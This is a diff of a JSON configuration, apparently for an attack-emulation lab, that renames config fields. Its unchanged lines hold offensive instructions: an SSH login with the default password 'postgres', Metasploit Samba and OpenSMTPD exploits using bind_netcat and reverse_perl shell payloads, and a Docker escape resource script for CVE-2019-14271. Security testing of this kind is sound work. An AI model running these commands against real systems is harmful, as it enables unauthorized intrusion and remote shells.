@@ -4,25 +4,27 @@
       "postgres_server": {
         "instructions": "shell\napt-get install sshpass\nsshpass -p postgres ssh -o 'StrictHostKeyChecking no' postgres@{} exit\necho $?",
         "attack_type": "SshAttack",
-        "wait_time": "10"
+        "wait_time": "10",
+        "config": ""
       },
       "smb_server": {
         "instructions": "setg payload cmd/unix/bind_netcat\nuse exploit/multi/samba/usermap_script\nsetg RHOSTS {}\nsetg LPORT {LPORT}\nexploit -p cmd/unix/bind_netcat",
         "attack_type": "",
-        "wait_time": "25"
+        "wait_time": "25",
+        "config": ""
       },
       "smtp_server": {
         "instructions": "back \n set payload cmd/unix/reverse_perl \n set ForceExploit true \n set DB_WORKSPACE . \n set RHOSTS {} \n set LISTENER {} \n set LPORT {LPORT} \n resource /data/attacker/custom_attacks/smtpd/attacco_opensmtpd_mod.rc",
         "attack_type": "ResourceAttack",
         "wait_time": "60",
-        "config_rc": " ../stack/data/attacker/custom_attacks/smtpd/config_rc.json"
+        "config": " ../stack/data/attacker/custom_attacks/smtpd/config_rc.json"
         
       },
       "tomcat_server": {
         "instructions": "back\nset RHOSTS {}\nset target 0\nset LPORT {LPORT}\nresource /data/attacker/custom_attacks/docker_escape/CVE-2019-14271.rc",
         "attack_type": "ResourceAttack",
         "wait_time": "30",
-        "config_rc": " ../stack/data/attacker/custom_attacks/docker_escape/config_rc.json"
+        "config": " ../stack/data/attacker/custom_attacks/docker_escape/config_rc.json"
       }
     },
         "infect":{
